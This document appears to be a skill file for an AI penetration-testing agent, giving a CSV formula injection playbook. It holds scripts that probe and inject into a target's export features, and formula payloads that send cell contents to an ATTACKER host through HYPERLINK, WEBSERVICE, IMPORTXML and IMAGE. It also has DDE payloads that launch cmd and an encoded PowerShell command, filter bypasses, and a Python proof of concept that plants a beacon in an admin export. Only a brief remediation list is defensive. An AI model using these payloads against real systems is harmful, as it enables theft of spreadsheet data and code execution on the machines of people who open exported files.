---
name: payload-csv-injection
description: "CSV formula injection payloads. Excel/Google Sheets formula execution via exported CSV, HYPERLINK exfiltration, WEBSERVICE/IMPORTXML data exfil, bypass techniques. Triggers: 'csv injection', 'formula injection', 'excel injection', 'spreadsheet injection', 'csv formula', 'csv export injection', 'google sheets injection', 'librecalc injection'."
---

# CSV / Formula Injection

User-controlled data exported to CSV/spreadsheet triggers formula evaluation.

**Vulnerable export surfaces:** reports, audit logs, billing exports, CRM data, user management exports.

---

## Phase 1: Detect Injection Point

```bash
TARGET="https://TARGET"

for path in /export /download /report /export.csv /users/export; do
  code=$(curl -so /dev/null -w '%{http_code}' "$TARGET$path")
  [ "$code" = "200" ] && echo "Export: $path"
done

# - Name, username, address, company
# - Inject: =1+1  → if exported CSV shows "2" → vulnerable

curl -s -X POST "$TARGET/profile/update" \
  -d "name==1%2B1"

curl -s "$TARGET/admin/users/export.csv" | head -10

```

---

## Phase 2: Payload List

```bash
# =1+1        → 2 (arithmetic)
# +1+1        → 2 (+ prefix)
# -1+1        → 0 (- prefix)
# @SUM(1,1)   → 2 (@ prefix)

PAYLOADS=(
  '=1+1'
  '+1+1'
  '-1+1'
  '@SUM(1,1)'
  '=HYPERLINK("https://ATTACKER/?c="&A1,"Click Me")'
  '=WEBSERVICE("https://ATTACKER/?data="&A1)'
  '=IMPORTXML(CONCAT("https://ATTACKER/",A1),"//a")'
  '=IMAGE("https://ATTACKER/?cookie="&A1)'
)

for payload in "${PAYLOADS[@]}"; do
  echo "Testing: $payload"
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  curl -s -X POST "$TARGET/profile" -d "username=$encoded"
  echo "---"
done
```

---

## Phase 3: Data Exfiltration via Formulas

```
=HYPERLINK(CONCATENATE("https://ATTACKER/?data=",A1,"::",B1),"Click here")

=WEBSERVICE("https://ATTACKER/?secret="&A2)

=IMPORTXML(CONCAT("https://ATTACKER/?d=",ENCODEURL(A1:A10)),"//a")

=WEBSERVICE(CONCAT("https://ATTACKER/?",CELL("contents",A1)))

=DDE("cmd","/C calc")
=DDE("cmd","/C powershell -enc BASE64_PAYLOAD")
```

---

## Phase 4: Bypass Techniques

```bash
"	=cmd"    # tab before =
" =cmd"     # space before =
"	+cmd"    # tab + plus

"+HYPERLINK(...)"
"-HYPERLINK(...)"
"@HYPERLINK(...)"

"=T(2+2)"   # T() wraps formula result

=HYPERLINK("https://ATTACKER/?a="&A1&"&b="&B1&"&c="&C1,"Link")

=HYPERLINK("https://ATTACKER/?data="&JOIN(",",A1:A100),"Export")
```

---

## Phase 5: PoC Demonstration

```python
# Payload to inject — creates beacon when spreadsheet opens:
import requests

PAYLOAD = '=HYPERLINK("https://ATTACKER.interactsh.com/?c="&A1&"::"&B1,"Result")'

# 1. Inject into user profile:
r = requests.post("https://TARGET/profile/update",
    cookies={"session": "YOUR_SESSION"},
    data={"first_name": PAYLOAD, "last_name": "Test"})

# 2. Trigger export as admin:
r = requests.get("https://TARGET/admin/export/users.csv",
    cookies={"session": "ADMIN_SESSION"})

# 3. Open downloaded CSV in Excel/LibreCalc
# 4. Monitor interactsh for beacon with cell data
```

---

## Remediation Reference

```
1. Escape formula-triggering characters at export time:
   if starts with = + - @: prefix with ' (apostrophe)
   Example: =CMD → '=CMD

2. Validate and sanitize all user input on the server side
3. Mark CSV exports with Content-Disposition and proper MIME type
4. Do not auto-open CSV files — prompt user to verify
5. Enable macro security settings in spreadsheet applications
```

---

## Output

Save to `.omop/engagement/vuln/csv-injection/`:
- `poc-payload.txt` — injected formula
- `export-poc.csv` — downloaded CSV with formula
- `exfil-beacon.txt` — captured exfil data (if triggered)

## Next Phase

→ `pentest-report` for final report
